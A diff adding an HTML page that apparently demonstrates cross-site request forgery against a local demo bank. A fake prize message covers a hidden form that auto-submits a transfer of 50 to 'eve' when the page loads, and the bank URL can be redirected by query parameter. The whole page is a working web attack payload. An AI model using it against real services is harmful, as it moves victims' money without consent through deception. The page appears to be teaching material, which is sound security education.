@@ -1,0 +1,13 @@
+<!-- Another site: a prize, and a hidden form sent as the page opens. -->
+<meta charset="utf-8">
+<body style="font: 22px system-ui; margin: 28px">
+<h1>🎁 You won a prize!</h1>
+<form id="f" method="post" action="http://localhost:8081/send">
+  <input type="hidden" name="to" value="eve">
+  <input type="hidden" name="amount" value="50">
+</form>
+<script>
+  const bank = new URLSearchParams(location.search).get('bank');
+  if (bank) f.action = bank + '/send';
+  f.submit();
+</script>
